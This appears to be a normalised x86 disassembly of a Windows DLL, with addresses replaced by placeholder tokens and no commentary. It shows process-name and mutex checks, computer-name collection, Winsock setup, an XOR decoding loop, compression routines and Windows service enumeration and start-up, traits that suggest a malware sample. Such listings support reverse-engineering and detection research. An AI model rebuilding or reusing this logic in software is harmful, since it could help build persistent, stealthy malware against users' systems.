call sub_10004cc5
cmp [ ebp - 0x7c ] eax
je r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
call [ Sleep@IAT ]
inc [ ebp - 0x70 ]
push 0x1388
call [ Sleep@IAT ]
mov edi [ ebp - 0x70 ]
imul edi edi 0x24
add edi [ ebp - 0x64 ]
cmp [ edi ] 0x0
jne r-xdata
push 0x230
call sub_10004aa8
pop ecx
test eax eax
je r-xdata
cmp esi [ ebx + 0x10 ]
jge r-xdata
push 0x64
cmp [ ebp - 0x60 ] 0x0
jne r-xdata
xor esi esi
mov esi eax
call sub_10007d14
mov esi eax
jmp r-xdata
push 0x64
call [ Sleep@IAT ]
add esi 0x64
cmp [ ebx + 0xc ] 0x0
jne r-xdata
cmp [ ebp - 0x6c ] 0x10
je r-xdata
mov eax [ esi ]
push rw-data
push rw-data
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x44 ]
push ecx
push [ edi + 0x20 ]
mov ecx esi
push edi
push [ ebp - 0x6c ]
mov [ ebp - 0x60 ] esi
call [ eax + 0x2c ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x60 ]
mov eax [ ecx ]
push 0x1
call [ eax ]
push 0x64
mov [ ebp - 0x59 ] 0x0
call [ Sleep@IAT ]
mov esi [ ebp - 0x60 ]
call sub_10009d54
test eax eax
jle r-xdata
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax ]
and [ ebp - 0x60 ] 0x0
mov eax [ esi ]
push rw-data
push rw-data
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x44 ]
push ecx
push [ edi + 0x20 ]
mov ecx esi
push edi
push 0x10
call [ eax + 0x2c ]
test eax eax
jne r-xdata
and [ ebx + 0x14 ] 0x0
push 0x20
lea edi [ ebx + 0x18 ]
push 0x0
push edi
mov [ ebp - 0x59 ] 0x1
mov [ ebp - 0x6c ] edi
call [ memset@IAT ]
push 0x48
call sub_10004aa8
add esp 0x10
test eax eax
je r-xdata
xor eax eax
mov esi eax
call sub_1000221c
jmp r-xdata
xor esi esi
lea eax [ esi + 0x8 ]
push eax
mov [ esi ] r--data
call [ InitializeCriticalSection@IAT ]
and [ esi + 0x20 ] 0x0
jmp r-xdata
push 0x24
mov [ edi ] eax
call sub_10004aa8
mov esi eax
pop ecx
test esi esi
je r-xdata
xor edi edi
push 0x8
lea eax [ edi + 0x10 ]
push esi
push eax
mov [ edi ] r--data
call [ memset@IAT ]
push esi
call [ _time64@IAT ]
mov [ edi + 0x8 ] eax
add esp 0x10
lea eax [ edi + 0x1c ]
push eax
mov [ edi + 0xc ] edx
mov [ edi + 0x18 ] esi
call [ InitializeCriticalSection@IAT ]
jmp r-xdata
push 0x38
mov [ ebx + 0x1c ] esi
call sub_10004aa8
mov edi eax
xor esi esi
pop ecx
cmp edi esi
je r-xdata
xor eax eax
mov edi eax
call sub_100059a9
jmp r-xdata
push 0x218
mov [ ebx + 0x20 ] edi
call sub_10004aa8
pop ecx
cmp eax esi
je r-xdata
mov esi [ ebp - 0x6c ]
push 0x8
pop edi
mov esi [ ebp - 0x60 ]
cmp [ ebx + 0xc ] 0x0
mov [ ebx + 0x24 ] eax
jne r-xdata
add esi 0x4
dec edi
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov eax [ esi ]
xor edi edi
push edi
mov ecx esi
call [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ esi ]
lea ecx [ ebp - 0x78 ]
push ecx
lea ecx [ ebp - 0x68 ]
push ecx
lea ecx [ ebp - 0x74 ]
push ecx
mov ecx esi
call [ eax + 0x38 ]
test eax eax
js r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov [ ebp - 0x58 ] edi
cmp [ ebx + 0x14 ] edi
jne r-xdata
jle r-xdata
mov eax [ esi ]
push 0xa
mov ecx esi
call [ eax + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
push 0x0
call [ _time64@IAT ]
mov edi eax
mov eax [ ebx ]
pop ecx
mov ecx edx
cdq
sub edi eax
sbb ecx edx
mov [ ebp - 0x7c ] ecx
js r-xdata
push 0x18
pop edi
cmp [ ebp - 0x74 ] 0xff00
jne r-xdata
cmp [ ebp - 0x58 ] 0x0
jl r-xdata
jg r-xdata
add edi 0x4
cmp edi 0x38
jb r-xdata
mov ecx [ edi + ebx ]
mov eax [ ecx ]
lea edx [ ebp - 0x78 ]
push edx
lea edx [ ebp - 0x68 ]
push edx
lea edx [ ebp - 0x74 ]
push edx
call [ eax + 0x14 ]
test eax eax
jle r-xdata
mov esi [ ebp - 0x6c ]
xor edi edi
mov ecx [ ebp - 0x68 ]
cmp [ ecx ] 0x21c
mov [ ebp - 0x7c ] ecx
jb r-xdata
push 0x0
call [ _time64@IAT ]
mov edi 0x21c
push edi
mov [ ebx ] eax
call sub_10004aa8
pop ecx
pop ecx
test eax eax
je r-xdata
cmp edi 0x1e
jbe r-xdata
cmp [ edi + ebx ] 0x0
je r-xdata
push 0x0
call [ _time64@IAT ]
pop ecx
push [ ebp - 0x78 ]
mov [ ebx ] eax
push [ ebp - 0x68 ]
mov eax [ esi ]
push [ ebp - 0x74 ]
mov ecx esi
call [ eax + 0x34 ]
mov ecx [ edi + ebx ]
push [ ebp - 0x68 ]
mov [ ebp - 0x58 ] eax
mov eax [ ecx ]
call [ eax + 0x1c ]
cmp [ ebp - 0x58 ] 0x0
jl r-xdata
inc edi
add esi 0x4
cmp edi 0x8
jb r-xdata
mov ecx [ esi ]
push [ ebp - 0x74 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x60 ]
push [ ebp - 0x68 ]
mov eax [ ecx ]
call [ eax + 0x3c ]
mov esi [ ebp - 0x60 ]
mov eax [ ecx + 0x4 ]
push 0x8
pop edi
cmp eax edi
ja r-xdata
and [ eax + 0x4 ] 0x0
push edi
push eax
mov [ eax ] edi
mov edx [ esi ]
push 0xff00
mov ecx esi
call [ edx + 0x34 ]
mov [ ebp - 0x58 ] eax
cmp [ esi ] 0x0
je r-xdata
jmp r-xdata
push [ ebp - 0x78 ]
mov ecx [ ebx + edi * 4 + 0x18 ]
push [ ebp - 0x68 ]
mov eax [ ecx ]
push [ ebp - 0x74 ]
call [ eax + 0x10 ]
jmp [ eax * 4 + jump_table_1000a499 ]
mov esi [ ebp - 0x6c ]
xor edi edi
mov [ ebp - 0x58 ] edi
call sub_100019f9
mov esi eax
cmp esi edi
je r-xdata
mov eax [ ecx + 0x8 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
and [ ebp - 0x58 ] 0x0
call sub_10001ae7
mov [ ebx + 0xc ] 0x1
mov ecx [ ebp - 0x60 ]
push [ ebp - 0x68 ]
mov eax [ ecx ]
call [ eax + 0x3c ]
mov eax [ ecx + 0x8 ]
imul eax eax 0x3c
mov [ ebx + 0x10 ] eax
jmp r-xdata
add esi 0x4
dec edi
jne r-xdata
mov ecx [ esi ]
mov eax [ ecx ]
call [ eax + 0xc ]
call [ GetLastError@IAT ]
mov ebx eax
cmp ebx edi
je r-xdata
or [ ebp - 0x58 ] 0xffffffff
mov [ ebx + 0xc ] 0x1
xor ebx ebx
jmp r-xdata
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
jmp r-xdata
push edi
push ebx
mov ebx [ ebp - 0x7c ]
push esi
call sub_10009cdf
mov esi eax
test edi edi
je r-xdata
call sub_10004d09
mov edi eax
push [ esi ]
mov ecx [ ebp - 0x60 ]
mov eax [ ecx ]
push esi
push 0xff00
call [ eax + 0x34 ]
push esi
call [ free@IAT ]
mov [ esp ] 0x3e8
call [ Sleep@IAT ]
mov ebx [ ebp - 0x84 ]
jmp r-xdata
push edi
call sub_10004ad0
pop ecx
cmp [ ebp - 0x58 ] 0x0
jl r-xdata
sub_1000a504
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x198
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x194 ] eax
push ebx
push esi
call [ GetTickCount@IAT ]
push eax
call [ srand@IAT ]
pop ecx
xor ebx ebx
push ebx
push ebx
call [ CoInitializeEx@IAT ]
lea eax [ esp + 0x8 ]
push eax
push 0x202
call [ WSAStartup@IAT ]
mov ecx r--data
call sub_10004c18
mov ecx r--data
call sub_10004c18
mov ecx r--data
call sub_10004c18
mov ecx r--data
call sub_10004c18
mov ecx r--data
call sub_10004c18
call sub_1000547b
test eax eax
je r-xdata
push 0x3c
call sub_10004aa8
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
call sub_1000507b
test eax eax
je r-xdata
xor esi esi
push ebx
mov [ esi + 0xc ] bl
call [ _time64@IAT ]
pop ecx
mov [ esi ] eax
lea eax [ esi + 0x8 ]
push eax
push ebx
push esi
push sub_1000a4bd
push ebx
push ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
call [ CreateThread@IAT ]
mov [ esi + 0x4 ] eax
jmp r-xdata
xor eax eax
cmp [ rw-data ] ebx
jbe r-xdata
mov ecx [ esp + 0x19c ]
mov [ rw-data ] esi
pop esi
pop ebx
xor ecx esp
call sub_1000eff2
mov esp ebp
pop ebp
retn
push [ rw-data ]
push rw-data
call sub_1000d163
pop ecx
pop ecx
xor esi esi
mov edx [ rw-data ]
mov ecx esi
shr edx cl
add esi 0x8
xor [ eax + rw-data ] dl
inc eax
cmp eax [ rw-data ]
jb r-xdata
sub_1000a635
mov eax [ rw-data ]
test eax eax
je r-xdata
and [ rw-data ] 0x0
retn
push esi
push edi
lea esi [ eax + 0x4 ]
mov edi eax
mov [ eax + 0xc ] 0x1
mov eax [ esi ]
test eax eax
je r-xdata
push edi
call sub_10004ae2
pop ecx
pop edi
pop esi
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
push 0x0
push [ esi ]
call [ TerminateThread@IAT ]
push [ esi ]
call [ CloseHandle@IAT ]
DllRegisterServer
push ebp
mov ebp esp
sub esp 0x18c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
call [ GetTickCount@IAT ]
push eax
call [ srand@IAT ]
pop ecx
call sub_1000547b
test eax eax
je r-xdata
call sub_10004af3
and eax 0xffff0000
cmp eax 0x6010000
jne r-xdata
push edi
mov edi rw-data
push edi
call sub_100097c7
pop ecx
test al al
je r-xdata
push 0x4
push 0x0
push rw-data
call [ MoveFileExW@IAT ]
push 0x104
lea eax [ ebp - 0x188 ]
push eax
push 0x0
call [ GetCurrentProcess@IAT ]
push eax
call [ GetModuleBaseNameA@IAT ]
lea eax [ ebp - 0x188 ]
push r--data
push eax
call [ _stricmp@IAT ]
pop ecx
pop ecx
test eax eax
jne r-xdata
call sub_10005639
test eax eax
je r-xdata
call sub_100019b3
pop edi
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
call sub_1000eff2
leave
retn
push eax
call [ ExitProcess@IAT ]
call sub_1000ef85
test eax eax
je r-xdata
push esi
call [ rand@IAT ]
cdq
mov ecx 0x3e7
idiv ecx
mov esi [ strlen@IAT ]
push edx
push r--data
push edi
call esi
pop ecx
push 0x40
pop ecx
sub ecx eax
push ecx
push edi
call esi
pop ecx
add eax edi
push eax
call [ _snprintf@IAT ]
add esp 0x10
pop esi
lea eax [ ebp - 0x18c ]
push eax
lea eax [ ebp - 0x84 ]
push eax
mov [ ebp - 0x18c ] 0x80
call [ GetComputerNameA@IAT ]
call [ rand@IAT ]
cdq
mov ecx 0x3e7
idiv ecx
lea eax [ ebp - 0x84 ]
push edx
push eax
push r--data
push 0x40
push edi
call [ _snprintf@IAT ]
add esp 0x14
jmp r-xdata
call sub_1000ed9e
call sub_1000997a
DllUnregisterServer
push ebp
mov ebp esp
sub esp 0x124
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
call [ GetTickCount@IAT ]
push eax
call [ srand@IAT ]
mov [ esp ] r--data
xor esi esi
push esi
push 0x1f0001
call [ OpenMutexA@IAT ]
cmp eax esi
je r-xdata
call sub_1000a61b
push 0x104
lea eax [ ebp - 0x108 ]
push eax
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ GetModuleBaseNameA@IAT ]
lea eax [ ebp - 0x108 ]
push r--data
push eax
call [ _stricmp@IAT ]
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
call [ CloseHandle@IAT ]
push esi
call [ ExitProcess@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_1000eff2
leave
retn
cmp [ rw-data ] si
je r-xdata
push edi
mov edi [ GetMessageA@IAT ]
push esi
push esi
push esi
lea eax [ ebp - 0x124 ]
push eax
call edi
test eax eax
jne r-xdata
pop edi
sub_1000a87f
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
mov esi [ ebp + 0x8 ]
add eax esi
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] eax
add esi 0x4
mov [ ecx ] esi
mov esi edx
mov edx esi
sub edx ebx
mov [ ebp - 0x8 ] edx
dec edx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] edx
cmp edx 0xbffe
ja r-xdata
movzx ecx [ esi + 0x2 ]
lea eax [ esi + 0x3 ]
mov [ ebp - 0x1c ] eax
mov al [ eax ]
movzx eax al
shl eax 0x6
xor eax ecx
shl eax 0x5
lea edx [ esi + 0x1 ]
movzx ecx [ edx ]
xor eax ecx
movzx ecx [ esi ]
shl eax 0x5
xor eax ecx
mov ecx [ ebp + 0x14 ]
imul eax eax 0x21
shr eax 0x5
and eax 0x3fff
lea ecx [ ecx + eax * 4 ]
mov ebx [ ecx ]
mov [ ebp - 0x20 ] edx
cmp ebx [ ebp + 0x8 ]
jb r-xdata
sub edi [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
mov [ eax ] edi
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
leave
retn
mov edx [ ebp - 0x20 ]
cmp [ ebp - 0x8 ] 0x800
jbe r-xdata
mov ax [ ebx ]
cmp ax [ esi ]
jne r-xdata
mov edx [ ebp - 0x1c ]
mov dl [ edx ]
mov [ ebp - 0x1 ] dl
cmp [ ebx + 0x3 ] dl
je r-xdata
mov al [ esi + 0x2 ]
cmp [ ebx + 0x2 ] al
jne r-xdata
mov ecx [ ebp + 0x14 ]
and eax 0x7ff
xor eax 0x201f
lea ecx [ ecx + eax * 4 ]
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jb r-xdata
mov [ ecx ] esi
sub esi [ ebp - 0xc ]
je r-xdata
mov eax esi
sub eax ebx
lea edx [ eax - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x14 ] edx
cmp edx 0xbffe
ja r-xdata
mov esi [ ebp - 0x1c ]
mov al [ esi ]
inc esi
cmp [ ebx + 0x3 ] al
jne r-xdata
mov edx esi
mov [ ebp - 0x20 ] edx
cmp edx 0x3
ja r-xdata
cmp eax 0x800
jbe r-xdata
dec esi
mov eax esi
sub eax [ ebp - 0xc ]
cmp [ ebp - 0x8 ] 0x800
ja r-xdata
mov al [ esi ]
inc esi
cmp [ ebx + 0x4 ] al
jne r-xdata
cmp edx 0x12
ja r-xdata
or [ edi - 0x2 ] dl
jmp r-xdata
mov al [ ebp - 0x1 ]
cmp [ ebx + 0x3 ] al
jne r-xdata
mov ecx 0x4000
sub al 0x2
cmp [ ebp - 0x8 ] ecx
ja r-xdata
mov ecx [ ebp - 0x14 ]
dec al
mov dl cl
shl al 0x3
and dl 0x7
or al dl
shl al 0x2
shr ecx 0x3
mov [ edi ] al
mov [ edi + 0x1 ] cl
jmp r-xdata
mov al [ esi ]
inc esi
cmp [ ebx + 0x5 ] al
jne r-xdata
lea eax [ edx - 0x12 ]
mov [ edi ] 0x0
mov ecx 0xff
inc edi
mov [ ebp - 0x18 ] eax
cmp eax ecx
jbe r-xdata
lea eax [ edx - 0x3 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
mov al [ eax ]
mov [ edi ] al
inc edi
inc [ ebp - 0xc ]
dec edx
jne r-xdata
sub [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
shr ecx 0xb
and cl 0x8
or cl al
or cl 0x10
mov [ edi ] cl
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x8 ] ecx
or al 0x20
jmp r-xdata
add edi 0x2
mov [ ebp - 0xc ] esi
jmp r-xdata
mov al [ esi ]
inc esi
cmp [ ebx + 0x6 ] al
jne r-xdata
mov [ edi ] al
inc edi
add eax 0xffffff00
xor edx edx
div ecx
lea esi [ eax + 0x1 ]
push esi
push 0x0
push edi
call memset
add esp 0xc
add edi esi
mov eax [ ebp - 0x10 ]
add eax 0xfffffff3
cmp esi eax
jb r-xdata
mov [ edi ] al
jmp r-xdata
mov al [ esi ]
inc esi
cmp [ ebx + 0x7 ] al
jne r-xdata
sub [ ebp - 0x18 ] 0xff
dec esi
jne r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x8 ]
mov cl al
inc edi
shl cl 0x2
shr eax 0x6
mov [ edi ] cl
mov [ edi + 0x1 ] al
mov al [ esi ]
inc esi
cmp [ ebx + 0x8 ] al
jne r-xdata
add ebx 0x9
jmp r-xdata
cmp esi [ ebp - 0x10 ]
jb r-xdata
mov al [ ebx ]
cmp al [ esi ]
jne r-xdata
mov ebx esi
sub ebx [ ebp - 0xc ]
mov eax 0x4000
cmp [ ebp - 0x8 ] eax
ja r-xdata
inc ebx
inc esi
sub [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
shr eax 0xb
and al 0x8
cmp ebx 0x9
ja r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
cmp ebx 0x21
ja r-xdata
sub ebx 0x9
or al 0x10
mov [ edi ] al
sub bl 0x2
or al bl
or al 0x10
sub ebx 0x21
mov [ edi ] 0x20
jmp r-xdata
sub bl 0x2
or bl 0x20
mov [ edi ] bl
jmp r-xdata
xor edx edx
mov ecx 0xff
lea eax [ ebx - 0x100 ]
div ecx
inc eax
push eax
push 0x0
push edi
mov [ ebp - 0x18 ] eax
call memset
add esp 0xc
add edi [ ebp - 0x18 ]
inc edi
cmp ebx 0xff
jbe r-xdata
sub ebx 0xff
dec [ ebp - 0x18 ]
jne r-xdata
jmp r-xdata
sub_1000ab5d
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx eax
push edi
mov edi ecx
cmp ebx 0xd
ja r-xdata
push [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
push edi
call sub_1000a87f
mov esi [ esi ]
add esp 0x10
add esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov ecx eax
mov ecx ebx
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ esi ] 0x11
add esi 0x2
mov [ esi ] 0x0
sub esi [ ebp + 0x8 ]
pop edi
inc esi
mov [ eax ] esi
pop esi
xor eax eax
pop ebx
leave
retn
sub edi ecx
add edi ebx
mov [ ebp - 0xc ] edi
cmp esi [ ebp + 0x8 ]
jne r-xdata
test ecx ecx
je r-xdata
cmp ecx 0x3
ja r-xdata
cmp ecx 0xee
ja r-xdata
cmp ecx 0x12
ja r-xdata
or [ esi - 0x2 ] cl
jmp r-xdata
lea eax [ ecx + 0x11 ]
jmp r-xdata
lea eax [ ecx - 0x12 ]
mov [ esi ] 0x0
mov ebx 0xff
inc esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jbe r-xdata
lea eax [ ecx - 0x3 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ esi ] al
inc esi
add eax 0xffffff00
xor edx edx
mov ecx ebx
div ecx
lea edi [ eax + 0x1 ]
push edi
push 0x0
push esi
call memset
add esp 0xc
add esi edi
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc eax
dec ecx
jne r-xdata
sub [ ebp - 0x8 ] ebx
dec edi
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
sub_1000ac2c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov dl [ esi ]
add eax esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
and [ eax ] 0x0
mov eax [ ebp + 0x8 ]
push edi
push 0x4
pop ebx
cmp dl 0x11
jbe r-xdata
movzx esi [ ecx ]
inc ecx
cmp esi 0x10
jae r-xdata
movzx edi dl
sub edi 0x11
lea ecx [ esi + 0x1 ]
cmp edi ebx
jb r-xdata
cmp esi 0x40
jb r-xdata
test esi esi
jne r-xdata
mov dl [ ecx ]
mov [ eax ] dl
inc eax
inc ecx
cmp edi 0x1
jbe r-xdata
mov dl [ ecx ]
mov [ eax ] dl
inc eax
inc ecx
dec edi
jne r-xdata
cmp esi 0x20
jb r-xdata
mov edx esi
shr edx 0x2
and edx 0x7
mov edi eax
sub edi edx
movzx edx [ ecx ]
shl edx 0x3
sub edi edx
dec edi
shr esi 0x5
inc ecx
dec esi
mov edx [ ecx ]
mov [ eax ] edx
add eax ebx
add ecx ebx
dec esi
je r-xdata
jmp r-xdata
movzx esi [ ecx ]
inc ecx
mov dl [ ecx ]
mov [ eax ] dl
inc eax
inc ecx
cmp edi 0x2
jbe r-xdata
jmp r-xdata
mov edi eax
cmp esi 0x10
jb r-xdata
and esi 0x1f
jne r-xdata
mov dl [ edi ]
mov [ eax ] dl
inc eax
inc edi
dec esi
jne r-xdata
jmp r-xdata
movzx esi [ ecx ]
inc ecx
cmp esi 0x10
jae r-xdata
cmp esi ebx
jb r-xdata
cmp [ ecx ] 0x0
je r-xdata
mov dl [ ecx ]
mov [ eax ] dl
inc eax
inc ecx
movzx edx [ ecx ]
shr esi 0x2
shl edx 0x2
sub edi esi
sub edi edx
mov dl [ edi - 0x1 ]
mov [ eax ] dl
mov dl [ edi ]
inc ecx
mov [ eax + 0x1 ] dl
add eax 0x2
jmp r-xdata
mov edx esi
and edx 0x8
shl edx 0xb
sub edi edx
and esi 0x7
jne r-xdata
movzx edx [ ecx ]
shr edx 0x2
mov edi eax
sub edi edx
dec edi
add ecx 0x2
jmp r-xdata
jmp r-xdata
movzx edi [ ecx - 0x2 ]
and edi 0x3
je r-xdata
movzx edx [ ecx ]
shl edx 0x2
shr esi 0x2
mov edi eax
sub edi esi
sub edi edx
mov dl [ edi - 0x801 ]
mov [ eax ] dl
mov dl [ edi - 0x800 ]
mov [ eax + 0x1 ] dl
mov dl [ edi - 0x7ff ]
inc ecx
mov [ eax + 0x2 ] dl
add eax 0x3
mov dl [ ecx ]
mov [ eax ] dl
inc eax
inc ecx
dec esi
jne r-xdata
mov edx [ ecx ]
mov [ eax ] edx
sub esi ebx
add eax ebx
add ecx ebx
cmp esi ebx
jae r-xdata
add esi 0xff
inc ecx
movzx edx [ ecx ]
lea esi [ esi + edx + 0xf ]
inc ecx
movzx edx [ ecx ]
shr edx 0x2
sub edi edx
add ecx 0x2
cmp edi eax
je r-xdata
jmp r-xdata
cmp esi 0x6
jb r-xdata
cmp [ ecx ] 0x0
je r-xdata
test esi esi
je r-xdata
sub eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax ecx
sub eax [ ebp - 0x4 ]
cmp ecx [ ebp - 0x4 ]
pop edi
sbb ecx ecx
and ecx 0xfffffffc
add ecx 0xfffffffc
neg eax
sbb eax eax
pop esi
and eax ecx
pop ebx
leave
retn
sub edi 0x4000
cmp [ ecx ] 0x0
je r-xdata
mov dl [ edi ]
mov [ eax ] dl
mov dl [ edi + 0x1 ]
mov [ eax + 0x1 ] dl
add eax 0x2
add edi 0x2
mov edx eax
sub edx edi
cmp edx ebx
jl r-xdata
add esi 0xff
inc ecx
movzx edx [ ecx ]
lea esi [ esi + edx + 0x1f ]
inc ecx
mov dl [ ecx ]
mov [ eax ] dl
inc eax
inc ecx
dec esi
jne r-xdata
add esi 0xff
inc ecx
movzx edx [ ecx ]
lea esi [ esi + edx + 0x7 ]
inc ecx
mov edx [ edi ]
mov [ eax ] edx
add eax ebx
add edi ebx
sub esi 0x2
jmp r-xdata
mov edx [ edi ]
mov [ eax ] edx
sub esi ebx
add eax ebx
add edi ebx
cmp esi ebx
jae r-xdata
test esi esi
je r-xdata
mov dl [ edi ]
mov [ eax ] dl
inc eax
inc edi
dec esi
jne r-xdata
jmp r-xdata
sub_1000ae5a
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub eax 0x0
je r-xdata
call sub_1000a635
mov eax [ rw-data ]
test eax eax
je r-xdata
dec eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn 0xc
push eax
call [ FreeLibrary@IAT ]
push esi
mov esi [ ebp + 0x8 ]
push esi
call [ DisableThreadLibraryCalls@IAT ]
call [ GetTickCount@IAT ]
push eax
call [ srand@IAT ]
mov [ esp ] 0x104
push rw-data
push esi
mov [ rw-data ] esi
call [ GetModuleFileNameW@IAT ]
call sub_1000eebe
pop esi
jmp r-xdata
sub_1000aebd
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
lea eax [ esi + 0x1c ]
push eax
mov [ ebp - 0x4 ] eax
call [ EnterCriticalSection@IAT ]
cmp [ esi + 0x18 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
call [ LeaveCriticalSection@IAT ]
pop esi
leave
retn
push edi
mov eax [ esi + 0x18 ]
mov edi [ eax + 0x8 ]
push eax
call sub_10004ad0
pop ecx
mov [ esi + 0x18 ] edi
test edi edi
jne r-xdata
and [ esi + 0x18 ] edi
pop edi
sub_1000aefc
push ebp
mov ebp esp
push esi
push 0x430
call [ malloc@IAT ]
mov esi eax
pop ecx
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x10
push ebx
mov ebx 0x218
push ebx
push 0x0
push esi
call [ memset@IAT ]
movzx eax [ ebp + 0x8 ]
mov [ esi + 0x10 ] eax
mov eax [ ebp + 0xc ]
add esp 0xc
cmp [ ebp + 0x10 ] 0x0
mov [ esi ] 0x430
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x14 ] eax
je r-xdata
push ebx
push [ ebp + 0x14 ]
lea eax [ esi + 0x218 ]
push eax
call [ memcpy@IAT ]
add esp 0xc
mov eax esi
pop ebx
push 0x80
push [ ebp + 0x10 ]
lea eax [ esi + 0x18 ]
push eax
call [ wcsncpy@IAT ]
add esp 0xc
xor eax eax
mov [ esi + 0x116 ] ax
sub_1000af7f
push ebp
mov ebp esp
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi ecx
mov eax [ edi + 0x10 ]
xor esi esi
sub eax esi
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x2c ] esi
je r-xdata
push 0x80000000
push esi
push esi
call [ OpenSCManagerA@IAT ]
mov [ ebp - 0x28 ] eax
cmp eax esi
je r-xdata
dec eax
je r-xdata
mov [ ebp - 0x24 ] 0x8
push esi
lea ecx [ ebp - 0x30 ]
push ecx
lea ecx [ ebp - 0x38 ]
push ecx
push esi
push esi
push 0x3
push 0x30
push eax
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x30 ] esi
call [ EnumServicesStatusA@IAT ]
test eax eax
jne r-xdata
push 0x20000000
push esi
push esi
call [ OpenSCManagerA@IAT ]
mov [ ebp - 0x28 ] eax
cmp eax esi
je r-xdata
dec eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x2c ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000eff2
leave
retn
mov eax [ ebp - 0x24 ]
call sub_10004d09
push edi
mov ebx eax
push ebx
push [ ebp - 0x24 ]
push esi
call [ GetLastError@IAT ]
mov [ ebp - 0x24 ] eax
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x24 ] eax
push 0x10
lea ecx [ edi + 0x14 ]
push ecx
push eax
call [ OpenServiceW@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
push 0x20000000
push esi
push esi
call [ OpenSCManagerA@IAT ]
mov [ ebp - 0x34 ] eax
cmp eax esi
je r-xdata
dec eax
jne r-xdata
push ebx
call sub_10004ad0
pop ecx
cmp [ ebp - 0x2c ] esi
jne r-xdata
push [ ebp - 0x38 ]
mov ebx [ malloc@IAT ]
call ebx
pop ecx
mov [ ebp - 0x34 ] eax
cmp eax esi
je r-xdata
call sub_1000aefc
mov [ ebp - 0x2c ] eax
cmp ebx esi
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x24 ] eax
push esi
push esi
push ebx
call [ StartServiceW@IAT ]
test eax eax
je r-xdata
push 0x20
lea ecx [ edi + 0x14 ]
push ecx
push eax
call [ OpenServiceW@IAT ]
mov ebx [ CloseServiceHandle@IAT ]
mov [ ebp - 0x28 ] eax
cmp eax esi
je r-xdata
push 0xf003f
push esi
push esi
call [ OpenSCManagerA@IAT ]
mov [ ebp - 0x34 ] eax
cmp eax esi
je r-xdata
mov [ ebp - 0x24 ] 0x8
jmp r-xdata
push esi
lea ecx [ ebp - 0x30 ]
push ecx
lea ecx [ ebp - 0x38 ]
push ecx
push [ ebp - 0x38 ]
push eax
push 0x3
push 0x30
push [ ebp - 0x28 ]
call [ EnumServicesStatusW@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x24 ]
call sub_10004d09
cmp [ ebp - 0x24 ] esi
mov ebx eax
push edi
push ebx
push [ ebp - 0x24 ]
sete al
movzx eax al
push eax
